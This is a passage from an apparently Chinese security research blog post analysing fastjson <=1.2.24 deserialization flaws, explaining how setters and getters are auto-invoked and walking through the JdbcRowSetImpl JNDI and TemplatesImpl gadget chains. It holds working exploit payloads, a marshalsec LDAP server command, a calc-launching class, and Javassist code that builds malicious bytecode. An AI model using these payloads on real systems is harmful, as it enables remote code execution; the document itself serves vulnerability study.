getprop函数被成功调用</span><br></pre></td></tr></table></figure><p>可以得知：</p><ul><li>public修饰符的属性会进行反序列化赋值，private修饰符的属性不会直接进行反序列化赋值，而是会调用setxxx(xxx为属性名)的函数进行赋值。</li><li>getxxx(xxx为属性名)的函数会根据函数返回值的不同，而选择被调用或不被调用</li></ul><p>决定这个set/get函数是否将被调用的代码最终在<code>com.alibaba.fastjson.util.JavaBeanInfo#build</code>函数处</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae27is4imj31xh0rg7an.jpg" alt="解析set-get.png"></p><p>在进入build函数后会遍历一遍传入class的所有方法，去寻找满足set开头的特定类型方法；再遍历一遍所有方法去寻找get开头的特定类型的方法</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae27eideej31sm0pw156.jpg" alt="set条件.png"></p><p><strong>set开头的方法要求如下：</strong></p><ul><li>方法名长度大于4且以set开头，且第四个字母要是大写</li><li>非静态方法</li><li>返回类型为void或当前类</li><li>参数个数为1个</li></ul><p>寻找到符合要求的set开头的方法后会根据一定规则提取方法名后的变量名（好像会过滤_，就是set_name这样的方法名中的下划线会被略过，得到name）。再去跟这个类的属性去比对有没有这个名称的属性。</p><p>如果没有这个属性并且这个set方法的输入是一个布尔型（是boolean类型，不是Boolean类型，这两个是不一样的），会重新给属性名前面加上<strong>is</strong>，再取头两个字符，第一个字符为大写（即isNa），去寻找这个属性名。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae26zr372j31w30ggtba.jpg" alt="get条件.png"></p><blockquote><p>这里的is就是有的网上有的文章中说反序列化会自动调用get、set、is方法的由来。个人觉得这种说法应该是错误的。</p><p>真实情况应该是确认存在符合setXxx方法后，会与这个方法绑定一个xxx属性，如果xxx属性不存在则会绑定isXx属性（这里is后第一个字符需要大写，才会被绑定）。并没有调用is开头的方法</p><p>自己从源码中分析或者尝试在类中添加isXx方法都是不会被调用的，这里只是为了指出其他文章中的一个错误。这个与调用的set方法绑定的属性，再之后并没有发现对于调用过程有什么影响。</p><p>所以只要目标类中有满足条件的set方法，然后得到的方法变量名存在于序列化字符串中，这个set方法就可以被调用。</p><p>如果有老哥确定是否可以调用is方法，可以联系我，非常感谢。</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae26zr372j31w30ggtba.jpg" alt="get条件.png"></p><p><strong>get开头的方法要求如下：</strong></p><ul><li>方法名长度大于等于4        </li><li>非静态方法</li><li>以get开头且第4个字母为大写</li><li>无传入参数</li><li>返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong</li></ul><p>所以我们上面例子中的getsex方法没有被调用是因为返回类型不符合，而getprop方法被成功调用是因为Properties 继承 Hashtable，而Hashtable实现了Map接口，返回类型符合条件。</p><p>再顺便看一下最后触发方法调用的地方com.alibaba.fastjson.parser.deserializer.FieldDeserializer#setValue，（在被调用的方法中下断点即可）</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae26u6n7bj31ha0oxdia.jpg" alt="调用方法处.png"></p><p>那么至此我们可以知道</p><ul><li>@type可以指定反序列化成服务器上的任意类</li><li>然后服务端会解析这个类，提取出这个类中符合要求的setter方法与getter方法（如setxxx）</li><li>如果传入json字符串的键值中存在这个值（如xxx)，就会去调用执行对应的setter、getter方法（即setxxx方法、getxxx方法）</li></ul><blockquote><p>上面说到readObejct(“”)还会额外调用toJSON调用所有getter函数，可以不符合要求。</p></blockquote><p>看上去应该是挺正常的使用逻辑，反序列化需要调用对应参数的setter、getter方法来恢复数据。</p><p>但是在可以调用任意类的情况下，如果setter、getter方法中存在可以利用的情况，就会导致任意命令执行。</p><p>对应反序列化攻击利用三要素来说，以上我们就是找到了readObject复写点，下面来探讨反序列化利用链。</p><p>我们先来看最开始的漏洞版本是&lt;=1.2.24，在这个版本前是默认支持@type这个属性的。</p><h2 id="【-lt-1-2-24】JNDI注入利用链——com-sun-rowset-JdbcRowSetImpl"><a href="#【-lt-1-2-24】JNDI注入利用链——com-sun-rowset-JdbcRowSetImpl" class="headerlink" title="【&lt;=1.2.24】JNDI注入利用链——com.sun.rowset.JdbcRowSetImpl"></a>【&lt;=1.2.24】JNDI注入利用链——com.sun.rowset.JdbcRowSetImpl</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>JNDI注入利用链是通用性最强的利用方式，在以下三种反序列化中均可使用：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">parse(jsonStr)</span><br><span class="line">parseObject(jsonStr)</span><br><span class="line">parseObject(jsonStr,Object.class)</span><br></pre></td></tr></table></figure></p><p>当然JDK版本有特殊需求，在JNDI注入一文中已说过，这里就不再说明</p><h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><p>在JNDI注入一文中我们已经介绍了利用链，把漏洞触发代码从</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String uri = <span class="string">"rmi://127.0.0.1:1099/aa"</span>;<span class="comment">//可控uri</span></span><br><span class="line">Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">ctx.lookup(uri);</span><br></pre></td></tr></table></figure><p>衍生到了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CLIENT</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        JdbcRowSetImpl JdbcRowSetImpl_inc = <span class="keyword">new</span> JdbcRowSetImpl();<span class="comment">//只是为了方便调用</span></span><br><span class="line">        JdbcRowSetImpl_inc.setDataSourceName(<span class="string">"rmi://127.0.0.1:1099/aa"</span>);<span class="comment">//可控uri</span></span><br><span class="line">        JdbcRowSetImpl_inc.setAutoCommit(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面尝试用fastjson的@type来使服务端执行以上代码，可以看到我们需要调用的两个函数都是以set开头！这说明我们可以把这个函数当作setter函数进行调用！</p><p>去看一下这两个函数接口符不符合setter函数的条件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public void setDataSourceName(String var1) throws SQLException</span><br><span class="line">public void setAutoCommit(boolean var1)throws SQLException</span><br></pre></td></tr></table></figure><ul><li style="list-style: none"><input type="checkbox" checked> 方法名长度大于4且以set开头，且第四个字母要是大写</li><li style="list-style: none"><input type="checkbox" checked> 非静态方法</li><li style="list-style: none"><input type="checkbox" checked> 返回类型为void或当前类</li><li style="list-style: none"><input type="checkbox" checked> 参数个数为1个</li></ul><p>完美符合！直接给出payload！</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    "@type":"com.sun.rowset.JdbcRowSetImpl",   //调用com.sun.rowset.JdbcRowSetImpl函数中的</span><br><span class="line">    "dataSourceName":"ldap://127.0.0.1:1389/Exploit",   // setdataSourceName函数 传入参数"ldap://127.0.0.1:1389/Exploit"</span><br><span class="line">    "autoCommit":true // 再调用setAutoCommit函数，传入true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>java环境：jdk1.8.0_161 &lt; 1.8u191 （可以使用ldap注入）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> 版本<span class="number">24</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.fastjson.User;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">POC</span> </span>&#123;</span><br><span class="line">    String payload =   <span class="string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":true&#125;"</span>;</span><br><span class="line">    JSON.parse(payload);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用工具起一个ldap服务</p><p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8090/#ExecTest</code></p><p>之前的ExecTest.class，也不用修改直接上来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExecTest</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ExecTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object var1, Name var2, Context var3, Hashtable&lt;?, ?&gt; var4)</span> </span>&#123;</span><br><span class="line">        exec(<span class="string">"xterm"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">exec</span><span class="params">(String var0)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var2) &#123;</span><br><span class="line">            var2.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] var0)</span> </span>&#123;</span><br><span class="line">        exec(<span class="string">"123"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在1.8下编译后使用python起web服务</p><p><code>py -3 -m http.server 8090</code></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae26iha62j322q127wut.jpg" alt="jndi计算器.png"></p><h2 id="【-lt-1-2-24】JDK1-7-的TemplatesImpl利用链"><a href="#【-lt-1-2-24】JDK1-7-的TemplatesImpl利用链" class="headerlink" title="【&lt;=1.2.24】JDK1.7 的TemplatesImpl利用链"></a>【&lt;=1.2.24】JDK1.7 的TemplatesImpl利用链</h2><h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><p>基于<code>JDK1.7u21 Gadgets</code> 的触发点TemplatesImple的利用条件比较苛刻：</p><ol><li>服务端使用parseObject()时，必须使用如下格式才能触发漏洞：<br><code>JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);</code></li><li>服务端使用parse()时，需要<code>JSON.parse(text1,Feature.SupportNonPublicField);</code></li></ol><p>这是因为payload需要赋值的一些属性为private属性，服务端必须添加特性才回去从json中恢复private属性的数据</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae265y6ofj30ze0t676p.jpg" alt="private属性.png"></p><blockquote><p>对于 JDK1.7u21 Gadgets 不熟悉的同学，可以参考我之前的文章。</p><p>在之前的文章也说过，TemplatesImpl对应的整条利用链是只有在JDK1.7u21附近的版本才能使用，但是最后TemplatesImpl这个类的触发点，其实是1.7全版本通用的。（因为修复只砍在了中间环节AnnotationInvocationHandler类）</p><p>那么实际上fastjson正是只利用了最后的TemplatesImpl触发点。这个利用方式实际上是1.7版本通用的。<br>其利用局限性在于服务端反序列化json的语句必须要支持private属性。</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae25r6kaij31zm0wotma.jpg" alt="1.7u21 TemplatesImpl链计算器.png"></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae25jl1alj322s0xzh02.jpg" alt="1.7u80 TemplatesImpl链计算器.png"></p><p>在Github上传的项目中<code>版本24.jdk7u21.java</code>是网上的payload。需要自己编译生成一个class文件不是很方便。</p><p>在<code>版本24.jdk7u21_mine</code>中自己把7u21链的payload中拿过来，自己改了下，可以自动生成payload。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jdk7u21_mine</span> </span>&#123;</span><br><span class="line">    <span class="comment">//最终执行payload的类的原始模型</span></span><br><span class="line">    <span class="comment">//ps.要payload在static模块中执行的话，原始模型需要用static方式。</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">lala</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//返回一个在实例化过程中执行任意代码的恶意类的byte码</span></span><br><span class="line">    <span class="comment">//如果对于这部分生成原理不清楚，参考以前的文章</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] getevilbyte() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass cc = pool.get(lala.class.getName());</span><br><span class="line">        <span class="comment">//要执行的最终命令</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span>;</span><br><span class="line">        <span class="comment">//之前说的静态初始化块和构造方法均可，这边用静态方法</span></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line"><span class="comment">//        CtConstructor cons = new CtConstructor(new CtClass[]&#123;&#125;, cc);</span></span><br><span class="line"><span class="comment">//        cons.setBody("&#123;"+cmd+"&#125;");</span></span><br><span class="line"><span class="comment">//        cc.addConstructor(cons);</span></span><br><span class="line">        <span class="comment">//设置不重复的类名</span></span><br><span class="line">        String randomClassName = <span class="string">"LaLa"</span>+System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        <span class="comment">//设置满足条件的父类</span></span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));</span><br><span class="line">        <span class="comment">//获取字节码</span></span><br><span class="line">        <span class="keyword">byte</span>[] lalaByteCodes = cc.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> lalaByteCodes;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//生成payload，触发payload</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title">poc</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//生成攻击payload</span></span><br><span class="line">        <span class="keyword">byte</span>[] evilCode = getevilbyte();<span class="comment">//生成恶意类的字节码</span></span><br><span class="line">        String evilCode_base64 = Base64.encodeBase64String(evilCode);<span class="comment">//使用base64封装</span></span><br><span class="line">        <span class="keyword">final</span> String NASTY_CLASS = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line">        String text1 = <span class="string">"&#123;"</span>+</span><br><span class="line">                <span class="string">"\"@type\":\""</span> + NASTY_CLASS +<span class="string">"\","</span>+</span><br><span class="line">                <span class="string">"\"_bytecodes\":[\""</span>+evilCode_base64+<span class="string">"\"],"</span>+</span><br><span class="line">                <span class="string">"'_name':'a.b',"</span>+</span><br><span class="line">                <span class="string">"'_tfactory':&#123; &#125;,"</span>+</span><br><span class="line">                <span class="string">"'_outputProperties':&#123; &#125;"</span>+</span><br><span class="line">                <span class="string">"&#125;\n"</span>;</span><br><span class="line">        <span class="comment">//此处删除了一些我觉得没有用的参数（第二个_name，_version，allowedProtocols），并没有发现有什么影响</span></span><br><span class="line">        System.out.println(text1);</span><br><span class="line">        <span class="comment">//服务端触发payload</span></span><br><span class="line">    ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//main函数调用以下poc而已</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            poc();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到payload使用<code>@type</code>反序列化了<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>这个类。</p><p>最终payload输出如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADMAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAARsYWxhAQAMSW5uZXJDbGFzc2VzAQAcTOeJiOacrDI0L2pkazd1MjFfbWluZSRsYWxhOwEAClNvdXJjZUZpbGUBABFqZGs3dTIxX21pbmUuamF2YQwABAAFBwATAQAa54mI5pysMjQvamRrN3UyMV9taW5lJGxhbGEBABBqYXZhL2xhbmcvT2JqZWN0AQAV54mI5pysMjQvamRrN3UyMV9taW5lAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAFQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMABcAGAoAFgAZAQAEY2FsYwgAGwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMAB0AHgoAFgAfAQARTGFMYTg4MTIwNDQ1NzYzMDABABNMTGFMYTg4MTIwNDQ1NzYzMDA7AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAIwoAJAAPACEAAgAkAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ACWxAAAAAgAHAAAABgABAAAADwAIAAAADAABAAAABQAJACIAAAAIABQABQABAAYAAAAWAAIAAAAAAAq4ABoSHLYAIFexAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ&quot;],&apos;_name&apos;:&apos;a.b&apos;,&apos;_tfactory&apos;:&#123; &#125;,&apos;_outputProperties&apos;:&#123; &#125;&#125;</span><br></pre></td></tr></table></figure><p> 7u21 那篇文中总结得到恶意TemplatesImple类需要满足如下条件。</p><ol><li>TemplatesImpl类的 <code>_name</code> 变量 != null</li><li>TemplatesImpl类的<code>_class</code>变量 == null</li><li>TemplatesImpl类的 <code>_bytecodes</code> 变量 != null</li><li>TemplatesImpl类的<code>_bytecodes</code>是我们代码执行的类的字节码。<code>_bytecodes</code>中的类必须是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>的子类</li><li>我们需要执行的恶意代码写在<code>_bytecodes</code> 变量对应的类的静态方法或构造方法中。</li><li>TemplatesImpl类的<code>_tfactory</code>需要是一个拥有getExternalExtensionsMap()方法的类，使用jdk自带的TransformerFactoryImpl类</li></ol><p>显而易见1-3，5均符合（_class没有赋值即为null）。</p><p>然后我们调用满足条件的恶意TemplatesImple类的getOutputProperties方法，完成RCE。这是fastjson将自动调用字段的getter方法导致的，我们看一下getOutputProperties方法是否满足自动调用getter方法的条件：</p><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title">getOutputProperties</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li style="list-style: none"><input type="checkbox" checked> 方法名长度大于等于4    </li><li style="list-style: none"><input type="checkbox" checked> 非静态方法</li><li style="list-style: none"><input type="checkbox" checked> 以get开头且第4个字母为大写</li><li style="list-style: none"><input type="checkbox" checked> 无传入参数</li><li style="list-style: none"><input type="checkbox" checked> 返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong（上面举例的时候说过Properties继承自Hashtables，实现了Map，所以符合）</li></ul><p>那么存在以下三个问题</p><ol><li>为什么<code>_tfactory</code>可以是一个空的对象，而不是一个拥有getExternalExtensionsMap的类？</li><li>_bytecodes为什么不再是字节码，而是需要base64编码？</li><li>我们要调用TemplatesImple类的getOutputProperties方法，但是为什么是<code>_outputProperties</code>字段，多了一个<code>_</code>？</li></ol><h3 id="tfactory为空的说明"><a href="#tfactory为空的说明" class="headerlink" title="_tfactory为空的说明"></a>_tfactory为空的说明</h3><p>在fastjson组件对于以上这一串东西进行解析时，会先解析出@type来还原出TemplatesImpl类。然后再根据之后的字段将TemplatesImpl类的属性赋值，至于赋值的内容会重新进行一次解析。</p><p>在看对于赋值内容的解析步骤时，会发现当赋值的值为一个空的Object对象时，会新建一个需要赋值的字段应有的格式的新对象实例。</p><p><code>/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java:627</code></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae255pusej321d145qc2.jpg" alt="_tfactory为空.png"></p><p><code>/com/alibaba/fastjson/parser/deserializer/DefaultFieldDeserializer.java:62</code></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae25093pcj31kb17qwk6.jpg" alt="_tfactory为空2.png"></p><p>那么_tfactory的应有的格式是哪来的呢，从定义来。</p><p><code>/com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A reference to the transformer factory that this templates</span></span><br><span class="line"><span class="comment"> * object belongs to.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> TransformerFactoryImpl _tfactory = <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure><p>所以之所以_tfactory的json字符串的值为空是OK的。</p><h3 id="bytecodes需要base64编码"><a href="#bytecodes需要base64编码" class="headerlink" title="_bytecodes需要base64编码"></a>_bytecodes需要base64编码</h3><p>跟踪<code>_bytecodes</code>字段的值处理，同样还是刚才的地方，但是由于<code>_bytecodes</code>的值不是对象，进入另一个赋值方式。</p><p><code>/com/alibaba/fastjson/parser/deserializer/DefaultFieldDeserializer.java:71</code></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae24s31kmj31hn199n2h.jpg" alt="base64-1.png"></p><p><code>com.alibaba.fastjson.serializer.ObjectArrayCodec#deserialze</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">      <span class="comment">//进去后判断字段类型，当前是class[B byte数组，上面啥都不做，进行解析</span></span><br><span class="line">...</span><br><span class="line">      &#125;</span><br><span class="line">      JSONArray array = <span class="keyword">new</span> JSONArray();</span><br><span class="line">      parser.parseArray(componentClass, array, fieldName);<span class="comment">//进入此处</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> (T) toObjectArray(parser, componentClass, array);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>com.alibaba.fastjson.parser.DefaultJSONParser#parseArray(java.lang.reflect.Type, java.util.Collection, java.lang.Object)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//type=class [B byte数组</span></span><br><span class="line"><span class="comment">//fieldName = _bytecodes</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">parseArray</span><span class="params">(Type type, Collection array, Object fieldName)</span> </span>&#123;</span><br><span class="line">...<span class="comment">//这边就是在根据type类型进行不同的处理</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;<span class="comment">//byte数组进入此处</span></span><br><span class="line">                        val = deserializer.deserialze(<span class="keyword">this</span>, type, i);<span class="comment">//在这句进行解析</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    array.add(val);</span><br><span class="line">                    checkListResolve(array);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (lexer.token() == JSONToken.COMMA) &#123;</span><br><span class="line">                    lexer.nextToken(deserializer.getFastMatchToken());</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.setContext(context);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><code>com.alibaba.fastjson.serializer.ObjectArrayCodec#deserialze</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 